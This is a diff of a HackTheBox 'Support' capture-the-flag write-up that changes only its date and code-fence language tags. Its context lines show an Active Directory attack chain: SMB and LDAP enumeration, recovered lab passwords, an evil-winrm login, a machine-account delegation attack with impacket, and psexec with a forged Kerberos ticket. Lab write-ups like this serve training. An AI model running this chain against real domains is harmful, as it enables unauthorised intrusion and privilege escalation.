@@ -1,6 +1,6 @@
 ---
 title: "Support"
-date: 2025-06-20
+date: 2024-11-26
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.174
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 17:48 CET
 Nmap scan report for 10.10.11.174
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 122.46 seconds
 
 We have `smb` shares
 
-```bash
+```shell
 $ smbclient -U "" -L //10.10.11.174   
 Password for [WORKGROUP\]:
 
@@ -128,12 +128,12 @@ class Protected
 
 Put it in a `.cs` file in a folder, install `dotnet` if not installed and
 
-```bash
+```shell
 csc program.cs
 dotnet run
 ```
 
-```bash
+```shell
 C:\Users\win\Desktop>dotnet run
 nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
@@ -144,19 +144,19 @@ If we inspect the function where the `ldap` connection is called:
 
 The user is `support\ldap`, so we can use `ldapsearch` to enumerate all the users
 
-```bash
+```shell
 $ ldapsearch -x -H ldap://support.htb -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb" "objectClass=user"
 ```
 
 Looking at all the users, we see the info field in `support`
 
-```bash
+```shell
 info: Ironside47pleasure40Watchful
 ```
 
 Now we have `support:Ironside47pleasure40Watchful` so let's try `evil-winrm`
 
-```bash
+```shell
 *Evil-WinRM* PS C:\> whoami                                                                                           support
 ```
 
@@ -167,7 +167,7 @@ Enumerating with `bloodhound` we see that our user has `GenericAll` over the `dc
 ![](../assets/Pasted%20image%2020241127164113.png)
 
 
-```bash
+```shell
 $ impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass buenas123@ -dc-ip 10.10.11.174 support.htb/support:'Ironside47pleasure40Watchful'
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -201,7 +201,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 Using the ticket, log in to the machine via `psexec`.
 
-```bash
+```shell
 $ KRB5CCNAME=/home/kali/support/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache  impacket-psexec -k dc.support.htb
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
